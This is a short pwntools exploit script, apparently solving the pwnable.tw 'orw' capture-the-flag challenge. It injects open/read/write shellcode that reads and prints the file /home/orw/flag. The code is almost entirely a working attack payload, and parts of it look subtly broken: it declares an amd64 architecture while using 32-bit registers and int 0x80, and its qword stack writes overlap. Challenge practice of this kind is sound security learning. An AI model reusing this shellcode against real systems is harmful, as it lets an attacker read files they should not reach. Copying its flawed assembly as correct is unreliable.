from pwn import *

io = process("./orw")
io = gdb.debug("./orw", '''
b *0x08048582
c
''')
# io = remote("chall.pwnable.tw", 10001)
context.log_level = 'debug' 
context.arch = "amd64"
payload = asm('''
mov qword ptr [esp], 0x6d6f682f
mov qword ptr [esp+4], 0x726f2f65
mov qword ptr [esp+8], 0x6c662f77
mov qword ptr [esp+12], 0x00006761

mov ebx, esp
mov eax, 5
xor ecx, ecx
xor edx, edx 
int 0x80

mov ebx, eax
mov ecx, esp
mov edx, 200
mov eax, 3
int 0x80

mov ebx, 1
mov ecx, esp
mov edx, eax
mov eax, 4
int 0x80

''')
io.recvuntil("de:")
io.send(payload)
io.interactive()
